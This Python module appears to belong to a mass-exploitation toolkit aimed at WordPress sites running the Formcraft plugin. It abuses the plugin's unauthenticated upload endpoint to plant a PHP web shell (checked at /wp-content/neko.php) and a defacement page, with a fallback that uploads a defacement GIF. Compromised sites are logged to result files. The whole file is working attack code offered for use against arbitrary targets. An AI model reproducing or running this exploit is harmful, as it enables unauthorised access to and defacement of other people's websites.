# coding=utf-8
import requests, re
import printModule

pagelinesExploitShell = 'files/settings_auto.php'
Jce_Deface_image = 'files/pwn.gif'
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}



def Exploit(site):
    try:
        ShellFile = {'files[]': open(pagelinesExploitShell, 'rb')}
        Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
        Check = requests.get(Exp, timeout=10, headers=Headers)
        if '"failed"' in str(Check.content):
            GoT = requests.post(Exp, files=ShellFile, timeout=10, headers=Headers)
            if 'new_name' in str(GoT.content):
                GetIndexName = re.findall('"new_name":"(.*)",', str(GoT.content))
                IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/' \
                            + GetIndexName[0].split('"')[0]
                CheckIndex = requests.get('http://' + IndexPath, timeout=10, headers=Headers)
                if CheckIndex.status_code == 200:
                    CheckShell = requests.get('http://' + site + '/wp-content/neko.php',
                                              timeout=10, headers=Headers)
                    CheckIndex = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                    if 'neko!!' in str(CheckShell.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/neko.php' + '\n')
                        if 'neko!!' in str(CheckIndex.content):
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/neko.htm' + '\n')
                        return printModule.returnYes(site, 'N/A', 'Wordpress Formcraft', 'Wordpress')
                    else:
                        return formcraftExploitIndeX(site)
                else:
                    return formcraftExploitIndeX(site)
            else:
                return formcraftExploitIndeX(site)
        else:
            return formcraftExploitIndeX(site)
    except:
        return formcraftExploitIndeX(site)


def formcraftExploitIndeX(site):
    try:
        ShellFile = {'files[]': open(Jce_Deface_image, 'rb')}
        Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
        Check = requests.get(Exp, timeout=10, headers=Headers)
        if '"failed"' in str(Check.content):
            GoT = requests.post(Exp, files=ShellFile, timeout=10, headers=Headers)
            if 'new_name' in str(GoT.content):
                GetIndexName = re.findall('"new_name":"(.*)",', str(GoT.content))
                IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/' \
                            + GetIndexName[0].split('"')[0]
                CheckIndex = requests.get('http://' + IndexPath, timeout=10, headers=Headers)
                if 'GIF89a' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    return printModule.returnYes(site, 'N/A', 'Wordpress Formcraft', 'Wordpress')
                else:
                    return printModule.returnNo(site, 'N/A', 'Wordpress Formcraft', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'Wordpress Formcraft', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'Wordpress Formcraft', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'Wordpress Formcraft', 'Wordpress')
